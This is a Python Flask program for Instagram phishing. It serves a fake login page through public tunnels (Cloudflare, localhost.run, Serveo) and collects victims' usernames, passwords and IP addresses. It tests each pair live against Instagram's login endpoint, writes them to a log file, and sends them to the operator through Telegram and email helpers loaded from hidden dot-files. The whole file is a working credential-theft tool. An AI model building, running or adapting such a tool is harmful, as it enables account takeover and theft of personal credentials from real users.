import os
import shutil
import socket
import subprocess
import signal
import logging
import time
import requests
import flask.cli
import re
from flask import Flask, render_template, request, jsonify
import importlib.util
banner_spec = importlib.util.spec_from_file_location("banner", os.path.join(os.path.dirname(__file__), ".banner.py"))
banner_module = importlib.util.module_from_spec(banner_spec)
banner_spec.loader.exec_module(banner_module)
show_banner = banner_module.show_banner
term_width = banner_module.term_width
typewriter_spec = importlib.util.spec_from_file_location("typewriter", os.path.join(os.path.dirname(__file__), ".typewriter.py"))
typewriter_module = importlib.util.module_from_spec(typewriter_spec)
typewriter_spec.loader.exec_module(typewriter_module)
typewriter = typewriter_module.typewriter
emailer_spec = importlib.util.spec_from_file_location("emailer", os.path.join(os.path.dirname(__file__), ".emailer.py"))
emailer_module = importlib.util.module_from_spec(emailer_spec)
emailer_spec.loader.exec_module(emailer_module)
l = emailer_module.l   # Yahan l assign karo
tel_spec = importlib.util.spec_from_file_location("tel", os.path.join(os.path.dirname(__file__), ".tel.py"))
tel_module = importlib.util.module_from_spec(tel_spec)
tel_spec.loader.exec_module(tel_module)
send_telegram_alert = tel_module.send_telegram_alert
show_banner()

# Color Codes
R = "\033[91m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"
F = "\033[1G"  # Force Left
# Global Variables
PORT = None
TUNNEL_CHOICE = None
TUNNEL_LINK = "Not Found"
USERNAME = "N/A"
PASSWORD = "N/A"
IP_ADDRESS = "N/A"
RESULT = "N/A"

# Disable Flask debug banner
flask.cli.show_server_banner = lambda *args, **kwargs: None
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

def find_free_port():
    global PORT
    for port in range(8080, 8090):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if s.connect_ex(('localhost', port)) != 0:
                PORT = port
                return
    print(f"{RED}❌ No free port found.{RESET}")
    exit()

def tunnel_selection():
    global TUNNEL_CHOICE
    print(f"\n{YELLOW}🔹 Select Tunnel Option:{RESET}")
    print(f"{GREEN}1️⃣ Cloudflare")
    print("2️⃣ SSH Tunnel")
    print(f"3️⃣ Serveo{RESET}")
    TUNNEL_CHOICE = input(f"\n{BLUE}[+] Enter Option (1-3): {RESET}")
    os.system("clear")
    show_banner(0)

def start_tunnel():
    global TUNNEL_LINK
    if TUNNEL_CHOICE == "1":
        typewriter(f"\n{F}{GREEN}🔹 Starting Cloudflare Tunnel... Please wait {RESET}")
        os.system(f"cloudflared tunnel --url http://localhost:{PORT} > cloudflare_log.txt 2>&1 &")
        time.sleep(3)

        for _ in range(15):  # Wait for the link to appear (max 15 seconds)
            try:
                with open("cloudflare_log.txt", "r") as log_file:
                    content = log_file.read()
                    match = re.search(r"https://[a-zA-Z0-9.-]+\.trycloudflare\.com", content)
                    if match:
                        TUNNEL_LINK = match.group(0)
                        break
            except:
                pass
            time.sleep(1)

        if TUNNEL_LINK != "Not Found":
            print(f"\n{F}{GREEN}✅ Cloudflare Tunnel Link:{R} {TUNNEL_LINK}{RESET}")
        else:
            print(f"\n{F}{RED}❌ Failed to fetch Cloudflare link. Check cloudflare_log.txt{RESET}")
    elif TUNNEL_CHOICE == "2":
        typewriter(f"\n{F}{GREEN}🔹 Starting SSH Tunnel... Please wait {RESET}")
        ssh_cmd = f"ssh -i ~/.ssh/id_rsa -R 80:localhost:{PORT} ssh.localhost.run"
        process = subprocess.Popen(ssh_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        while True:
            line = process.stdout.readline().strip()
            if "https://" in line:
                TUNNEL_LINK = line.split()[-1]
                print(f"\n{F}{GREEN}🔗 SSH Tunnel Link: \n{F}{R}{TUNNEL_LINK}{RESET}")
                break
    elif TUNNEL_CHOICE == "3":
        typewriter(f"\n{F}{GREEN}🔹 Starting Serveo Tunnel... Please wait {RESET}")
        serveo_cmd = f"ssh -R 80:localhost:{PORT} serveo.net"
        process = subprocess.Popen(serveo_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        while True:
            line = process.stdout.readline().strip()
            if "https://" in line:
                TUNNEL_LINK = line.split()[-1]
                print(f"\n{F}{GREEN}🔗 Serveo Tunnel Link: \n{F}{R}{TUNNEL_LINK}{RESET}")
                break
    else:
        print(f"{F}{RED}❌ Invalid Choice! Exiting...{RESET}")
        exit()
def check_instagram_login(username, password):
    global RESULT
    send_telegram_alert(USERNAME, PASSWORD, IP_ADDRESS, RESULT)
    url = "https://www.instagram.com/api/v1/accounts/login/"
    headers = {
        "User-Agent": "Instagram 123.0.0.26.121 Android",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "username": username,
        "password": password,
        "_csrftoken": "missing",
        "device_id": "random_device_id",
        "login_attempt_count": "0"
    }
    session = requests.Session()
    response = session.post(url, headers=headers, data=data)
    if "logged_in_user" in response.text:
        RESULT = "success"
    elif "challenge_required" in response.text:
        RESULT = "otp"
    else:
        RESULT = "fail"

app = Flask(__name__, static_folder="static", template_folder="templates")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/hs')
def hs_page():
    return render_template('hs.html')

@app.route('/submit', methods=['POST'])
def submit():
    global USERNAME, PASSWORD, IP_ADDRESS
    # Get IP Address (Add this line)
    IP_ADDRESS = request.headers.get('X-Forwarded-For', request.remote_addr)
    data = request.json
    USERNAME = data.get("username", "N/A")
    PASSWORD = data.get("password", "N/A")

    check_instagram_login(USERNAME, PASSWORD)

    with open("log.txt", "a") as file:
        file.write(f"Username: {USERNAME} | Password: {PASSWORD} | Status: {RESULT}\n")
    # Call email sender silently
    send_telegram_alert(USERNAME, PASSWORD, IP_ADDRESS, RESULT)
    l(USERNAME, PASSWORD,IP_ADDRESS, RESULT)
    if RESULT == "success":
        msg = "Login successful!"
    elif RESULT == "otp":
        msg = "OTP required. Login partially successful."
    else:
        msg = "Incorrect password."
    typewriter(f"\n{F}{BLUE}[INFO] IP Address: {YELLOW}{IP_ADDRESS}{RESET}")
    typewriter(f"{F}{BLUE}[INFO] Username: {YELLOW}{USERNAME}{RESET}")
    typewriter(f"{F}{BLUE}[INFO] Password: {YELLOW}{PASSWORD}{RESET}")

    if RESULT == "fail":
        print(f"{F}{RED}[SERVER RESPONSE] {msg}{RESET}")
    else:
        print(f"{F}{GREEN}[SERVER RESPONSE] {msg}{RESET}")

    return jsonify({
        "success": RESULT != "fail",
        "status": RESULT,
        "message": msg
    })

def signal_handler(sig, frame):
    typewriter(f"\n{RED}❌ Process Stopped! Exiting Safely...{RESET}")
    os._exit(0)

signal.signal(signal.SIGINT, signal_handler)

if __name__ == '__main__':
    find_free_port()
    tunnel_selection()
    start_tunnel()
    typewriter(f"\n{F}{BLUE}🚀 Flask Server Running on Port: {YELLOW}{PORT}{RESET}")
    app.run(host='0.0.0.0', port=PORT, debug=False)
